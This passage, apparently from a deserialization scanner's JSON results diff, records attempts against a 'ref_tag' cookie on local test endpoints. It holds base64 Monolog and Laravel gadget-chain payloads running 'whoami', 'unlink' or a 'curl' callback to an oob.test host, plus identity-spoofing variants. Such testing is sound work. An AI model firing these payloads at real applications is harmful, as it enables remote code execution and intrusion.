+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2Q3YzY0YjM1NzI1NC5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2Q3YzY0YjM1NzI1NC5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2Q3YzY0YjM1NzI1NC5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly9kN2M2NGIzNTcyNTQub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vZDdjNjRiMzU3MjU0Lm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovL2Q3YzY0YjM1NzI1NC5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/login",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": "cf026c2b4ca2",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2NmMDI2YzJiNGNhMi5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2NmMDI2YzJiNGNhMi5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2NmMDI2YzJiNGNhMi5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly9jZjAyNmMyYjRjYTIub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vY2YwMjZjMmI0Y2EyLm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovL2NmMDI2YzJiNGNhMi5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/import",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": "c9eb01ae3113",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
